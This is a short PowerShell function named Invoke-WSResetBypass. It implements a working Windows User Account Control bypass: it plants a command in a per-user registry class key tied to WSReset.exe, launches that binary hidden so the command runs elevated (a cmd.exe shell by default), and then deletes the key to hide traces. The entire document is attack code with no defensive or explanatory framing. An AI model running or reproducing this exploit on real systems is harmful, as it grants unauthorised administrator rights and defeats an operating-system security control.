function Invoke-WSResetBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )
      
      $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      
      New-Item $CommandPath -Force | Out-Null
      
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null

      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden

      if (Test-Path $filePath) {
          Remove-Item $filePath -Recurse -Force
      }
}
